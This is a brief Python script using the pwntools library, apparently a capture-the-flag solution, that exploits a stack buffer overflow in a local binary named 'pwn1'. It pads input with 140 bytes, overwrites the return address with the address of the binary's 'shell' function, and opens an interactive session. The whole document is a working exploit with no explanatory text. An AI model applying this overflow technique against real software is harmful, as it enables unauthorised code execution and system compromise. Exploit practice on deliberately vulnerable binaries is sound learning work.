from pwn import *

elf=ELF('./pwn1')
address=p32(elf.symbols['shell'])
print(address)

padding=b'a'*140
msg=padding+address

p=process('./pwn1')
p.sendline(msg)
p.interactive()